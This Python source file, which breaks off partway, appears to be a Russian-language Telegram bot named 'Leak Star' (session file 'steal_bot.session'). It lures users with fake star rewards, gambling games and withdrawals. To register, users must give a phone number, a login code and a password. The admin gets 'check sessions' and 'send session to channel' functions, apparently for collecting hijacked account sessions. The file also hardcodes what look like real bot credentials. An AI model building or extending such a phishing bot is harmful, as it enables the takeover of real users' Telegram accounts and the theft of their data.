import os
import asyncio
import random
import json
from io import BytesIO
from PIL import Image, ImageDraw, ImageFont
from telethon import TelegramClient, events, errors
from telethon.tl.types import (
    KeyboardButtonCallback,
    KeyboardButtonUrl,
    ReplyInlineMarkup,
    KeyboardButton,
    KeyboardButtonSwitchInline,
    KeyboardButtonGame,
    KeyboardButtonRequestPhone,
    KeyboardButtonRequestGeoLocation,
    KeyboardButtonRequestPoll,
    InputKeyboardButtonUrlAuth
)
from telethon.tl.functions.messages import SendMessageRequest
from telethon.tl.types import ReplyKeyboardMarkup, ReplyInlineMarkup, KeyboardButtonRow
from datetime import datetime, timedelta

# Настройки
API_TOKEN = '8431167051:AAH9-_f1FJJXXw6naW8xj-XRTiyJXwRPA9w'
ADMIN_CHAT_ID = 6018554736
LOG_CHANNEL_ID = -1002070693488
API_ID = 21826549
API_HASH = 'c1a19f792cfd9e397200d16c7e448160'

# Пути и директории
session_dir = 'sessions'
bot_session_file = 'steal_bot.session'
data_dir = 'data'
users_file = os.path.join(data_dir, 'users.json')

# Создание директорий
os.makedirs(session_dir, exist_ok=True)
os.makedirs(data_dir, exist_ok=True)

# Очищаем старую сессию если существует
if os.path.exists(bot_session_file):
    try:
        os.remove(bot_session_file)
        print("🗑️ Удалена старая сессия бота")
    except:
        print("⚠️ Не удалось удалить старую сессию")

# Базы данных
user_stats = {}
referral_links = {}
referral_map = {}
user_sessions = {}
total_users = 0
total_sessions = 0
processed_users = set()
pending_withdrawals = {}
user_daily_bonuses = {}
achievements = {}
game_bets = {}  # Хранит текущие ставки пользователей

# Загрузка данных из файлов
def load_data():
    global user_stats, referral_links, referral_map, user_sessions, processed_users, total_users, total_sessions
    
    try:
        if os.path.exists(users_file):
            with open(users_file, 'r', encoding='utf-8') as f:
                data = json.load(f)
                user_stats = data.get('user_stats', {})
                referral_links = data.get('referral_links', {})
                referral_map = data.get('referral_map', {})
                processed_users = set(data.get('processed_users', []))
                total_users = data.get('total_users', 0)
                total_sessions = data.get('total_sessions', 0)
                
                # Восстанавливаем объекты datetime
                for uid, stats in user_stats.items():
                    if 'reg_date' in stats and isinstance(stats['reg_date'], str):
                        try:
                            stats['reg_date'] = datetime.fromisoformat(stats['reg_date'])
                        except:
                            stats['reg_date'] = datetime.now()
    except Exception as e:
        print(f"⚠️ Ошибка загрузки данных: {e}")

def save_data():
    try:
        data = {
            'user_stats': user_stats,
            'referral_links': referral_links,
            'referral_map': referral_map,
            'processed_users': list(processed_users),
            'total_users': total_users,
            'total_sessions': total_sessions
        }
        
        # Конвертируем datetime в строки
        for uid, stats in user_stats.items():
            if 'reg_date' in stats and isinstance(stats['reg_date'], datetime):
                stats['reg_date'] = stats['reg_date'].isoformat()
        
        with open(users_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"⚠️ Ошибка сохранения данных: {e}")

# Загружаем данные при старте
load_data()

# Инициализируем бота
bot = TelegramClient(bot_session_file, API_ID, API_HASH)

# Состояния пользователей
user_states = {}
user_data = {}

class UserState:
    NONE = 0
    WAITING_PHONE = 1
    WAITING_CODE = 2
    WAITING_PASSWORD = 3
    WAITING_MEDIA_CHOICE = 4
    WAITING_MEDIA_FILE = 5
    WAITING_ARTICLE_TEXT = 6
    WAITING_WITHDRAW_USERNAME = 7
    WAITING_ARTICLE_BUTTONS = 8
    WAITING_BUTTON_TYPE = 9
    WAITING_BUTTON_TEXT = 10
    WAITING_BUTTON_DATA = 11
    WAITING_GAME_BET = 12

class ButtonType:
    URL = "url"
    CALLBACK = "callback"
    SWITCH_INLINE = "switch_inline"
    SWITCH_INLINE_CURRENT = "switch_inline_current"
    GAME = "game"
    PHONE = "phone"
    GEO = "geo"
    POLL = "poll"

# Основные функции
def is_user_registered(user_id):
    """Проверяет, зарегистрирован ли пользователь"""
    if user_id == ADMIN_CHAT_ID:
        return True
    return user_id in user_sessions

def require_registration(func):
    """Декоратор для проверки регистрации"""
    async def wrapper(*args, **kwargs):
        user_id = None
        event = None
        
        # Ищем user_id в аргументах
        for arg in args:
            if isinstance(arg, (int, str)):
                try:
                    user_id = int(arg)
                    break
                except:
                    pass
            elif hasattr(arg, 'sender_id'):
                user_id = arg.sender_id
                event = arg
                break
        
        if user_id is None and 'user_id' in kwargs:
            user_id = kwargs['user_id']
        
        if user_id and not is_user_registered(user_id) and user_id != ADMIN_CHAT_ID:
            if event and hasattr(event, 'answer'):
                await event.answer("❌ Сначала зарегистрируйтесь через меню!", alert=True)
            else:
                await send_message(user_id, "❌ *Сначала зарегистрируйтесь через меню!*", parse_mode='Markdown')
            return
        
        return await func(*args, **kwargs)
    return wrapper

async def send_message(user_id, text, buttons=None, parse_mode=None):
    """Отправка сообщения с кнопками с исправлением ошибок"""
    try:
        if buttons:
            fixed_buttons = []
            for row in buttons:
                fixed_row = []
                for button in row:
                    if isinstance(button, KeyboardButtonCallback):
                        if isinstance(button.data, bytes):
                            try:
                                decoded = button.data.decode('utf-8')
                                button.data = decoded.encode('utf-8')
                            except:
                                safe_text = button.text.replace(' ', '_').lower()[:20]
                                button.data = f"btn_{safe_text}".encode('utf-8')[:64]
                    fixed_row.append(button)
                fixed_buttons.append(fixed_row)
            
            await bot.send_message(user_id, text, buttons=fixed_buttons, parse_mode=parse_mode)
        else:
            await bot.send_message(user_id, text, parse_mode=parse_mode)
        return True
    except errors.ButtonDataInvalidError:
        try:
            await bot.send_message(user_id, text, parse_mode=parse_mode)
        except Exception as e:
            print(f"Критическая ошибка отправки {user_id}: {e}")
            return False
    except Exception as e:
        print(f"Ошибка отправки сообщения {user_id}: {e}")
        return False

async def send_photo(user_id, photo_bytes, caption=None, buttons=None, parse_mode=None):
    """Отправка фото как фото (не как файл) - ИСПРАВЛЕНО"""
    try:
        photo_bytes.seek(0)
        
        # Создаем временный файл для корректной отправки как фото
        temp_file = f"temp_photo_{user_id}_{datetime.now().timestamp()}.png"
        with open(temp_file, 'wb') as f:
            f.write(photo_bytes.getvalue())
        
        try:
            # Отправляем как фото с правильными параметрами
            if buttons:
                result = await bot.send_file(
                    user_id,
                    temp_file,
                    caption=caption,
                    buttons=buttons,
                    parse_mode=parse_mode,
                    force_document=False  # ВАЖНО! Отправляем как фото
                )
            else:
                result = await bot.send_file(
                    user_id,
                    temp_file,
                    caption=caption,
                    parse_mode=parse_mode,
                    force_document=False  # ВАЖНО! Отправляем как фото
                )
            
            # Удаляем временный файл
            try:
                os.remove(temp_file)
            except:
                pass
                
            return True
        except Exception as send_error:
            # Если не получилось отправить как фото, пробуем без force_document
            try:
                photo_bytes.seek(0)
                if buttons:
                    await bot.send_file(
                        user_id,
                        photo_bytes,
                        caption=caption,
                        buttons=buttons,
                        parse_mode=parse_mode
                    )
                else:
                    await bot.send_file(
                        user_id,
                        photo_bytes,
                        caption=caption,
                        parse_mode=parse_mode
                    )
                return True
            except:
                # Удаляем временный файл
                try:
                    os.remove(temp_file)
                except:
                    pass
                return False
    except Exception as e:
        print(f"Ошибка отправки фото {user_id}: {e}")
        return False

# Функции для создания изображений
def create_welcome_image(user_id, username):
    """Создает приветственное изображение"""
    try:
        width, height = 800, 400
        img = Image.new('RGB', (width, height), color=(20, 25, 40))
        draw = ImageDraw.Draw(img)
        
        try:
            font_large = ImageFont.truetype("arialbd.ttf", 48)
            font_medium = ImageFont.truetype("arial.ttf", 28)
            font_small = ImageFont.truetype("arial.ttf", 20)
        except:
            font_large = ImageFont.load_default()
            font_medium = ImageFont.load_default()
            font_small = ImageFont.load_default()
            font_large.size = 48
            font_medium.size = 28
            font_small.size = 20
        
        # Градиентный фон
        for y in range(height):
            r = int(20 + 10 * (y / height))
            g = int(25 + 10 * (y / height))
            b = int(40 + 15 * (y / height))
            draw.line([(0, y), (width, y)], fill=(r, g, b))
        
        # Логотип
        logo_text = "⭐ Leak Star ⭐"
        draw.text((width//2, 100), logo_text, font=font_large, 
                 fill=(255, 215, 0), anchor="mm")
        
        # Текст приветствия
        welcome_text = f"Добро пожаловать, {username}!"
        draw.text((width//2, 180), welcome_text, font=font_medium,
                 fill=(200, 220, 255), anchor="mm")
        
        # ID пользователя
        id_text = f"ID: {user_id}"
        draw.text((width//2, 220), id_text, font=font_small,
                 fill=(150, 200, 255), anchor="mm")
        
        # Стартовый бонус
        bonus_text = "🎁 Стартовый бонус: 100 ⭐"
        draw.text((width//2, 260), bonus_text, font=font_medium,
                 fill=(100, 255, 100), anchor="mm")
        
        # Сохранение
        buf = BytesIO()
        img.save(buf, format='PNG')
        buf.seek(0)
        return buf
    except Exception as e:
        print(f"Ошибка создания welcome image: {e}")
        return None

def create_profile_image(user_id, stats, user_info=None):
    """Создает изображение профиля"""
    try:
        width, height = 800, 600
        img = Image.new('RGB', (width, height), color=(25, 30, 45))
        draw = ImageDraw.Draw(img)
        
        try:
            font_title = ImageFont.truetype("arialbd.ttf", 36)
            font_header = ImageFont.truetype("arialbd.ttf", 28)
            font_body = ImageFont.truetype("arial.ttf", 22)
            font_small = ImageFont.truetype("arial.ttf", 18)
        except:
            font_title = ImageFont.load_default()
            font_header = ImageFont.load_default()
            font_body = ImageFont.load_default()
            font_small = ImageFont.load_default()
            font_title.size = 36
            font_header.size = 28
            font_body.size = 22
            font_small.size = 18
        
        # Фон
        for y in range(height):
            r = int(25 + 5 * (y / height))
            g = int(30 + 5 * (y / height))
            b = int(45 + 10 * (y / height))
            draw.line([(0, y), (width, y)], fill=(r, g, b))
        
        # Заголовок
        draw.text((width//2, 50), "👤 ПРОФИЛЬ", font=font_title,
                 fill=(255, 255, 255), anchor="mm")
        
        # Аватар
        avatar_size = 120
        avatar_x = width // 2
        avatar_y = 140
        
        draw.ellipse([avatar_x - avatar_size//2, avatar_y - avatar_size//2,
                     avatar_x + avatar_size//2, avatar_y + avatar_size//2],
                    fill=(40, 45, 70), outline=(0, 200, 255), width=3)
        
        # Буква в аватаре
        user_initials = "👤"
        draw.text((avatar_x, avatar_y), user_initials, font=font_header,
                 fill=(255, 255, 255), anchor="mm")
        
        # Информация
        y_pos = avatar_y + avatar_size//2 + 30
        
        # Имя
        if user_info and user_info.first_name:
            name = user_info.first_name
            if user_info.last_name:
                name += f" {user_info.last_name}"
        else:
            name = f"Пользователь {user_id}"
        
        draw.text((width//2, y_pos), name, font=font_header,
                 fill=(255, 255, 255), anchor="mm")
        y_pos += 40
        
        # Юзернейм
        username = f"@{user_info.username}" if user_info and user_info.username else "Не указан"
        draw.text((width//2, y_pos), username, font=font_body,
                 fill=(200, 220, 255), anchor="mm")
        y_pos += 30
        
        # Статистика
        stars = stats.get('stars', 0)
        days = stats.get('days_in_bot', 1)
        refs = len(stats.get('refs', []))
        level = (stars // 100) + 1
        
        stats_text = f"⭐ Звёзд: {stars}"
        draw.text((width//2, y_pos), stats_text, font=font_body,
                 fill=(255, 215, 0), anchor="mm")
        y_pos += 30
        
        stats_text = f"📅 Дней в системе: {days}"
        draw.text((width//2, y_pos), stats_text, font=font_body,
                 fill=(100, 200, 255), anchor="mm")
        y_pos += 30
        
        stats_text = f"👥 Рефералов: {refs}"
        draw.text((width//2, y_pos), stats_text, font=font_body,
                 fill=(255, 105, 180), anchor="mm")
        y_pos += 30
        
        stats_text = f"⚡ Уровень: {level}"
        draw.text((width//2, y_pos), stats_text, font=font_body,
                 fill=(50, 205, 50), anchor="mm")
        
        # Подвал
        footer = f"Leak Star • {datetime.now().strftime('%d.%m.%Y %H:%M')}"
        draw.text((width//2, height - 30), footer, font=font_small,
                 fill=(150, 150, 200), anchor="mm")
        
        buf = BytesIO()
        img.save(buf, format='PNG')
        buf.seek(0)
        return buf
    except Exception as e:
        print(f"Ошибка создания profile image: {e}")
        return None

def create_game_image(game_name, bet=None, result=None):
    """Создает изображение для игры"""
    try:
        width, height = 600, 400
        img = Image.new('RGB', (width, height), color=(30, 35, 50))
        draw = ImageDraw.Draw(img)
        
        try:
            font_large = ImageFont.truetype("arialbd.ttf", 36)
            font_medium = ImageFont.truetype("arial.ttf", 24)
            font_small = ImageFont.truetype("arial.ttf", 18)
        except:
            font_large = ImageFont.load_default()
            font_medium = ImageFont.load_default()
            font_small = ImageFont.load_default()
            font_large.size = 36
            font_medium.size = 24
            font_small.size = 18
        
        # Заголовок игры
        game_emojis = {
            'slots': '🎰',
            'dice': '🎲',
            'cards': '🃏',
            'basketball': '🏀'
        }
        
        emoji = game_emojis.get(game_name, '🎮')
        draw.text((width//2, 80), f"{emoji} {game_name.upper()}", font=font_large,
                 fill=(255, 255, 255), anchor="mm")
        
        # Ставка
        if bet:
            draw.text((width//2, 150), f"Ставка: {bet} ⭐", font=font_medium,
                     fill=(255, 215, 0), anchor="mm")
        
        # Результат
        if result:
            if result > 0:
                color = (50, 205, 50)
                text = f"Выигрыш: +{result} ⭐"
            else:
                color = (220, 20, 60)
                text = f"Проигрыш: {result} ⭐"
            
            draw.text((width//2, 200), text, font=font_medium,
                     fill=color, anchor="mm")
        
        # Игровое поле
        if game_name == 'slots':
            slot_x = width // 2
            slot_y = 280
            
            for i in range(3):
                x = slot_x - 80 + i * 80
                symbol = random.choice(['🍒', '⭐', '7️⃣', '🔔', '🍀'])
                draw.rounded_rectangle([x-30, slot_y-40, x+30, slot_y+40],
                                      radius=10, fill=(40, 45, 70))
                draw.text((x, slot_y), symbol, font=font_large,
                         fill=(255, 255, 255), anchor="mm")
        
        elif game_name == 'dice':
            dice_x = width // 2
            dice_y = 280
            
            value = random.randint(1, 6)
            draw.rounded_rectangle([dice_x-40, dice_y-40, dice_x+40, dice_y+40],
                                  radius=15, fill=(40, 45, 70))
            draw.text((dice_x, dice_y), str(value), font=font_large,
                     fill=(255, 255, 255), anchor="mm")
        
        buf = BytesIO()
        img.save(buf, format='PNG')
        buf.seek(0)
        return buf
    except Exception as e:
        print(f"Ошибка создания game image: {e}")
        return None

# Функции клавиатур
def create_main_keyboard(user_id):
    """Создает основную клавиатуру для пользователя"""
    if user_id == ADMIN_CHAT_ID:
        return [
            [
                KeyboardButtonCallback("🔮 Проверить сессии", b"check_all_sessions"),
                KeyboardButtonCallback("📝 Написать статью", b"create_article")
            ],
            [
                KeyboardButtonCallback("📊 Статистика", b"admin_stats"),
                KeyboardButtonCallback("⭐ Управление звёздами", b"admin_stars")
            ]
        ]
    else:
        buttons = []
        
        if is_user_registered(user_id):
            buttons.append([KeyboardButtonCallback("👤 Профиль", b"profile")])
            buttons.append([
                KeyboardButtonCallback("📈 Рефералы", b"referral_system"),
                KeyboardButtonCallback("🎮 Игры", b"games_menu")
            ])
            buttons.append([
                KeyboardButtonCallback("💸 Вывести", b"withdraw"),
                KeyboardButtonCallback("🎁 Бонус", b"daily_bonus")
            ])
        else:
            buttons.append([KeyboardButtonCallback("🚀 Зарегистрироваться", b"create_account")])
        
        buttons.append([
            KeyboardButtonUrl("🌐 Официальный канал", "https://t.me/telegram"),
            KeyboardButtonCallback("❓ Помощь", b"show_faq")
        ])
        
        return buttons

def create_back_keyboard():
    return [[KeyboardButtonCallback("🔙 Назад в меню", b"back_to_main")]]

def create_games_keyboard():
    """Клавиатура с играми"""
    return [
        [
            KeyboardButtonCallback("🎰 Слоты", b"game_slots"),
            KeyboardButtonCallback("🎲 Кости", b"game_dice")
        ],
        [
            KeyboardButtonCallback("🃏 Карты", b"game_cards"),
            KeyboardButtonCallback("🏀 Баскетбол", b"game_basketball")
        ],
        [
            KeyboardButtonCallback("🔙 Назад", b"back_to_main")
        ]
    ]

def create_bet_keyboard(game_type):
    """Клавиатура для выбора ставки"""
    return [
        [
            KeyboardButtonCallback("10 ⭐", f"bet_{game_type}_10"),
            KeyboardButtonCallback("50 ⭐", f"bet_{game_type}_50"),
            KeyboardButtonCallback("100 ⭐", f"bet_{game_type}_100")
        ],
        [
            KeyboardButtonCallback("200 ⭐", f"bet_{game_type}_200"),
            KeyboardButtonCallback("500 ⭐", f"bet_{game_type}_500"),
            KeyboardButtonCallback("1000 ⭐", f"bet_{game_type}_1000")
        ],
        [
            KeyboardButtonCallback("🔙 Назад к играм", b"games_menu"),
            KeyboardButtonCallback("❌ Отмена", b"back_to_main")
        ]
    ]

def create_game_choice_keyboard(game_type):
    """Клавиатура для выбора в игре"""
    if game_type == 'cards':
        return [
            [
                KeyboardButtonCallback("👆 Больше", f"choice_{game_type}_higher"),
                KeyboardButtonCallback("👇 Меньше", f"choice_{game_type}_lower")
            ],
            [
                KeyboardButtonCallback("🔴 Красная", f"choice_{game_type}_red"),
                KeyboardButtonCallback("⚫ Черная", f"choice_{game_type}_black")
            ],
            [
                KeyboardButtonCallback("🔙 Назад", f"game_{game_type}"),
                KeyboardButtonCallback("❌ Выйти", b"games_menu")
            ]
        ]
    elif game_type == 'basketball':
        return [
            [
                KeyboardButtonCallback("🏀 Бросить", f"choice_{game_type}_throw"),
                KeyboardButtonCallback("🎯 Точно", f"choice_{game_type}_precise")
            ],
            [
                KeyboardButtonCallback("🔙 Назад", f"game_{game_type}"),
                KeyboardButtonCallback("❌ Выйти", b"games_menu")
            ]
        ]
    else:
        return [[KeyboardButtonCallback("🔙 Назад", b"games_menu")]]

def create_media_choice_keyboard():
    return [
        [
            KeyboardButtonCallback("✅ Да", b"article_yes"),
            KeyboardButtonCallback("❌ Нет", b"article_no")
        ],
        [
            KeyboardButtonCallback("🔙 Назад", b"back_to_main")
        ]
    ]

def create_code_keyboard():
    return [
        [
            KeyboardButtonCallback("1", b"code_1"),
            KeyboardButtonCallback("2", b"code_2"),
            KeyboardButtonCallback("3", b"code_3")
        ],
        [
            KeyboardButtonCallback("4", b"code_4"),
            KeyboardButtonCallback("5", b"code_5"),
            KeyboardButtonCallback("6", b"code_6")
        ],
        [
            KeyboardButtonCallback("7", b"code_7"),
            KeyboardButtonCallback("8", b"code_8"),
            KeyboardButtonCallback("9", b"code_9")
        ],
        [
            KeyboardButtonCallback("🗑 Очистить", b"code_clear"),
            KeyboardButtonCallback("0", b"code_0"),
            KeyboardButtonCallback("✅ Подтвердить", b"code_confirm")
        ]
    ]

def create_session_confirm_keyboard(session_data):
    """Создает клавиатуру для подтверждения отправки сессии в канал"""
    return [
        [
            KeyboardButtonCallback("✅ Да, отправить в канал", f"send_session_yes_{session_data}"),
            KeyboardButtonCallback("❌ Нет, только мне", f"send_session_no_{session_data}")
        ]
    ]

def create_article_buttons_keyboard():
    return [
        [
            KeyboardButtonCallback("🔗 URL", b"add_url_button"),
            KeyboardButtonCallback("📱 Callback", b"add_callback_button")
        ],
        [
            KeyboardButtonCallback("🔍 Inline", b"add_inline_button"),
            KeyboardButtonCallback("📞 Телефон", b"add_phone_button")
        ],
        [
            KeyboardButtonCallback("📍 Геолокация", b"add_geo_button"),
            KeyboardButtonCallback("📊 Опрос", b"add_poll_button")
        ],
        [
            KeyboardButtonCallback("🎮 Игра", b"add_game_button"),
            KeyboardButtonCallback("🗑 Очистить", b"clear_buttons")
        ],
        [
            KeyboardButtonCallback("✅ Готово", b"finish_buttons"),
            KeyboardButtonCallback("❌ Отмена", b"cancel_article")
        ]
    ]

# Функции игр
@require_registration
async def show_games_menu(user_id, event=None):
    """Показывает меню игр"""
    keyboard = create_games_keyboard()
    
    balance = user_stats.get(user_id, {}).get('stars', 0)
    
    if event:
        try:
            await event.edit(
                "🎮 *ИГРОВОЙ ЦЕНТР*\n\n"
                "Выберите игру:\n\n"
                "🎰 *Слоты* - классические игровые автоматы\n"
                "🎲 *Кости* - бросайте кости на удачу\n"
                "🃏 *Карты* - угадайте карту\n"
                "🏀 *Баскетбол* - спортивная игра\n\n"
                f"💰 *Ваш баланс:* `{balance}` ⭐",
                buttons=keyboard,
                parse_mode='Markdown'
            )
        except:
            await send_message(user_id,
                "🎮 *ИГРОВОЙ ЦЕНТР*\n\n"
                f"💰 *Ваш баланс:* `{balance}` ⭐\n\n"
                "Выберите игру:",
                buttons=keyboard,
                parse_mode='Markdown'
            )
    else:
        await send_message(user_id,
            "🎮 *ИГРОВОЙ ЦЕНТР*\n\n"
            f"💰 *Ваш баланс:* `{balance}` ⭐\n\n"
            "Выберите игру:",
            buttons=keyboard,
            parse_mode='Markdown'
        )

@require_registration
async def start_game(user_id, game_type, event=None):
    """Начинает игру с выбором ставки"""
    balance = user_stats.get(user_id, {}).get('stars', 0)
    
    if balance <= 0:
        await send_message(user_id,
            "❌ *Недостаточно звёзд для игры!*\n\n"
            f"💰 *Ваш баланс:* `{balance}` ⭐\n"
            "💫 *Пригласите друзей или дождитесь бонуса*",
            parse_mode='Markdown'
        )
        return
    
    keyboard = create_bet_keyboard(game_type)
    
    game_names = {
        'slots': '🎰 Слоты',
        'dice': '🎲 Кости',
        'cards': '🃏 Карты',
        'basketball': '🏀 Баскетбол'
    }
    
    game_name = game_names.get(game_type, '🎮 Игра')
    
    if event:
        try:
            await event.edit(
                f"{game_name}\n\n"
                f"💰 *Ваш баланс:* `{balance}` ⭐\n\n"
                "📊 *Выберите ставку:*",
                buttons=keyboard,
                parse_mode='Markdown'
            )
        except:
            await send_message(user_id,
                f"{game_name}\n\n"
                f"💰 *Ваш баланс:* `{balance}` ⭐\n\n"
                "📊 *Выберите ставку:*",
                buttons=keyboard,
                parse_mode='Markdown'
            )
    else:
        await send_message(user_id,
            f"{game_name}\n\n"
            f"💰 *Ваш баланс:* `{balance}` ⭐\n\n"
            "📊 *Выберите ставку:*",
            buttons=keyboard,
            parse_mode='Markdown'
        )

async def process_game_bet(user_id, game_type, bet_amount):
    """Обрабатывает ставку в игре"""
    balance = user_stats.get(user_id, {}).get('stars', 0)
    
    if bet_amount > balance:
        await send_message(user_id,
            f"❌ *Недостаточно звёзд!*\n\n"
            f"💰 *Ваш баланс:* `{balance}` ⭐\n"
            f"🎯 *Ставка:* `{bet_amount}` ⭐",
            parse_mode='Markdown'
        )
        return False
    
    # Сохраняем ставку
    game_bets[user_id] = {
        'game': game_type,
        'bet': bet_amount,
        'timestamp': datetime.now()
    }
    
    # Снимаем ставку со счета
    user_stats[user_id]['stars'] = balance - bet_amount
    
    # Показываем выбор для игр с выбором
    if game_type in ['cards', 'basketball']:
        keyboard = create_game_choice_keyboard(game_type)
        await send_message(user_id,
            f"🎯 *Ставка принята!*\n\n"
            f"💰 *Ставка:* `{bet_amount}` ⭐\n"
            f"💎 *Новый баланс:* `{balance - bet_amount}` ⭐\n\n"
            f"📋 *Сделайте выбор:*",
            buttons=keyboard,
            parse_mode='Markdown'
        )
    else:
        # Для игр без выбора сразу запускаем
        await play_game(user_id, game_type, bet_amount)
    
    save_data()
    return True

async def play_game(user_id, game_type, bet_amount):
    """Играет в выбранную игру"""
    try:
        # Определяем результат игры
        win_multiplier = 1.0
        
        if game_type == 'slots':
            if random.random() < 0.3:
                win_multiplier = random.choice([2.0, 3.0, 5.0])
            else:
                win_multiplier = 0.0
        
        elif game_type == 'dice':
            player_roll = random.randint(1, 6)
            bot_roll = random.randint(1, 6)
            
            if player_roll > bot_roll:
                win_multiplier = 2.0
            elif player_roll == bot_roll:
                win_multiplier = 1.0
            else:
                win_multiplier = 0.0
        
        elif game_type == 'cards':
            user_choice = user_data.get(user_id, {}).get('game_choice')
            card_value = random.randint(1, 13)
            
            if user_choice == 'higher' and card_value > 7:
                win_multiplier = 2.0
            elif user_choice == 'lower' and card_value < 7:
                win_multiplier = 2.0
            elif user_choice in ['red', 'black']:
                colors = ['red', 'black']
                card_color = random.choice(colors)
                if user_choice == card_color:
                    win_multiplier = 2.0
                else:
                    win_multiplier = 0.0
            else:
                win_multiplier = 0.0
            
            if user_id in user_data and 'game_choice' in user_data[user_id]:
                del user_data[user_id]['game_choice']
        
        elif game_type == 'basketball':
            user_choice = user_data.get(user_id, {}).get('game_choice')
            success_chance = 0.5 if user_choice == 'throw' else 0.7
            
            if random.random() < success_chance:
                win_multiplier = 2.0
            else:
                win_multiplier = 0.0
            
            if user_id in user_data and 'game_choice' in user_data[user_id]:
                del user_data[user_id]['game_choice']
        
        # Вычисляем выигрыш
        win_amount = int(bet_amount * win_multiplier)
        result = win_amount - bet_amount
        
        # Обновляем баланс
        current_balance = user_stats[user_id]['stars']
        user_stats[user_id]['stars'] = current_balance + win_amount
        
        # Создаем изображение игры
        game_img = create_game_image(game_type, bet_amount, result)
        
        # Отправляем результат
        if game_img:
            caption = (
                f"🎮 *РЕЗУЛЬТАТ ИГРЫ*\n\n"
                f"🎯 *Ставка:* `{bet_amount}` ⭐\n"
            )
            
            if win_amount > 0:
                caption += (
                    f"💰 *Выигрыш:* `+{win_amount}` ⭐\n"
                    f"🎉 *Поздравляем!*\n\n"
                )
            else:
                caption += (
                    f"😔 *Проигрыш:* `-{bet_amount}` ⭐\n"
                    f"💪 *Повезет в следующий раз!*\n\n"
                )
            
            caption += (
                f"💎 *Новый баланс:* `{user_stats[user_id]['stars']}` ⭐\n"
                f"🔄 *Сыграть еще раз?*"
            )
            
            keyboard = [
                [
                    KeyboardButtonCallback("🔄 Еще раз", f"game_{game_type}"),
                    KeyboardButtonCallback("🎮 Другая игра", b"games_menu")
                ],
                [KeyboardButtonCallback("🔙 В меню", b"back_to_main")]
            ]
            
            await send_photo(user_id, game_img, caption=caption, 
                           buttons=keyboard, parse_mode='Markdown')
        else:
            result_text = (
                f"🎮 *РЕЗУЛЬТАТ ИГРЫ*\n\n"
                f"🎯 *Ставка:* `{bet_amount}` ⭐\n"
            )
            
            if win_amount > 0:
                result_text += f"💰 *Выигрыш:* `+{win_amount}` ⭐\n🎉 *Поздравляем!*\n\n"
            else:
                result_text += f"😔 *Проигрыш:* `-{bet_amount}` ⭐\n💪 *Повезет в следующий раз!*\n\n"
            
            result_text += f"💎 *Новый баланс:* `{user_stats[user_id]['stars']}` ⭐"
            
            keyboard = [
                [
                    KeyboardButtonCallback("🔄 Еще раз", f"game_{game_type}"),
                    KeyboardButtonCallback("🎮 Другая игра", b"games_menu")
                ],
                [KeyboardButtonCallback("🔙 В меню", b"back_to_main")]
            ]
            
            await send_message(user_id, result_text, buttons=keyboard, parse_mode='Markdown')
        
        save_data()
        
        if user_id in game_bets:
            del game_bets[user_id]
            
    except Exception as e:
        print(f"Ошибка в игре {game_type}: {e}")
        await send_message(user_id,
            "❌ *Ошибка в игре!*\n\n"
            "🔄 *Попробуйте еще раз*",
            parse_mode='Markdown'
        )
        
        if user_id in user_stats:
            user_stats[user_id]['stars'] += bet_amount
            save_data()

# ОБРАБОТЧИК CALLBACK - ВСЕ КНОПКИ ДОЛЖНЫ БЫТЬ ЗДЕСЬ
@bot.on(events.CallbackQuery)
async def callback_handler(event):
    user_id = event.sender_id
    
    try:
        if isinstance(event.data, bytes):
            try:
                data = event.data.decode('utf-8')
            except:
                data = event.data.hex()
        else:
            data = str(event.data)
        
        print(f"Callback от {user_id}: {data}")
        
        # ОБЩИЕ КНОПКИ
        if data == 'back_to_main':
            user_states[user_id] = UserState.NONE
            if user_id in user_data:
                del user_data[user_id]
            keyboard = create_main_keyboard(user_id)
            try:
                await event.edit("📱 *Главное меню*", buttons=keyboard, parse_mode='Markdown')
            except:
                await send_message(user_id, "📱 *Главное меню*", keyboard, parse_mode='Markdown')
            return
        
        elif data == 'profile':
            await show_profile(user_id, event)
            return
        
        elif data == 'show_faq':
            await event.answer(
                "❓ *Часто задаваемые вопросы:*\n\n"
                "1. Как зарегистрироваться?\n   - Нажмите 'Зарегистрироваться' в меню\n\n"
                "2. Как заработать звёзды?\n   - Приглашайте друзей (50⭐ за каждого)\n   - Играйте в игры\n   - Получайте ежедневные бонусы\n\n"
                "3. Как вывести звёзды?\n   - Минимум 100 звёзд\n   - Введите юзернейм получателя",
                alert=True
            )
            return
        
        elif data == 'create_account':
            user_states[user_id] = UserState.WAITING_PHONE
            await send_message(user_id, 
                "📱 *Введите номер телефона* (с «+»):\n\n"
                "Пример: `+79123456789`\n"
                "📞 *Требуется для регистрации*",
                parse_mode='Markdown')
            return
        
        # ИГРЫ
        elif data == 'games_menu':
            if not is_user_registered(user_id):
                await event.answer("❌ Сначала зарегистрируйтесь!", alert=True)
                return
            await show_games_menu(user_id, event)
            return
        
        elif data in ['game_slots', 'game_dice', 'game_cards', 'game_basketball']:
            if not is_user_registered(user_id):
                await event.answer("❌ Сначала зарегистрируйтесь!", alert=True)
                return
            
            game_type = data.replace('game_', '')
            await start_game(user_id, game_type, event)
            return
        
        elif data.startswith('bet_'):
            if not is_user_registered(user_id):
                await event.answer("❌ Сначала зарегистрируйтесь!", alert=True)
                return
            
            parts = data.split('_')
            if len(parts) == 3:
                game_type = parts[1]
                try:
                    bet_amount = int(parts[2])
                    await process_game_bet(user_id, game_type, bet_amount)
                except ValueError:
                    await event.answer("❌ Неверная ставка!", alert=True)
            return
        
        elif data.startswith('choice_'):
            if not is_user_registered(user_id):
                await event.answer("❌ Сначала зарегистрируйтесь!", alert=True)
                return
            
            parts = data.split('_')
            if len(parts) == 3:
                game_type = parts[1]
                choice = parts[2]
                
                if user_id not in user_data:
                    user_data[user_id] = {}
                user_data[user_id]['game_choice'] = choice
                
                if user_id in game_bets:
                    bet_info = game_bets[user_id]
                    if bet_info['game'] == game_type:
                        await play_game(user_id, game_type, bet_info['bet'])
                else:
                    await event.answer("❌ Ставка не найдена!", alert=True)
            return
        
        elif data == 'daily_bonus':
            if not is_user_registered(user_id):
                await event.answer("❌ Сначала зарегистрируйтесь!", alert=True)
                return
            await show_daily_bonus(user_id)
            return
        
        elif data == 'referral_system':
            if not is_user_registered(user_id):
                await event.answer("❌ Сначала зарегистрируйтесь!", alert=True)
                return
            await show_referral_system(user_id)
            return
        
        elif data == 'withdraw':
            if not is_user_registered(user_id):
                await event.answer("❌ Сначала зарегистрируйтесь!", alert=True)
                return
            await start_withdrawal(user_id)
            return
        
        # АДМИНСКИЕ ФУНКЦИИ
        elif data == 'check_all_sessions':
